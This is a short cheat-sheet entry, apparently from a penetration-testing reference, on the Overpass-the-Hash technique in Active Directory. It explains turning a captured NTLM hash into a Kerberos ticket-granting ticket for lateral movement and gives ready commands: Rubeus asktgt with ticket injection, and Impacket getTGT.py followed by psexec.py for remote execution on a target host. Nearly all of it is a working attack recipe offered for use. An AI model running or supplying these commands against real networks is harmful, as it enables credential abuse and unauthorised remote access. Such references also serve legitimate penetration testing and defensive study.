**The bridge between the two login worlds.** If you hold an NTLM _hash_ but the target only accepts _Kerberos_, Overpass-the-Hash converts that hash into a fresh Kerberos ticket (TGT) so you can use ticket-based tools to move laterally. Reach for it when plain Pass-the-Hash is blocked but Kerberos is allowed.

```
# NTLM hash → Kerberos TGT:
.\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /domain:corp.local /ptt

# Linux:
getTGT.py corp.local/user -hashes :<NTLM_HASH> -dc-ip 192.168.x.100
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass corp.local/user@<TARGET_FQDN>
```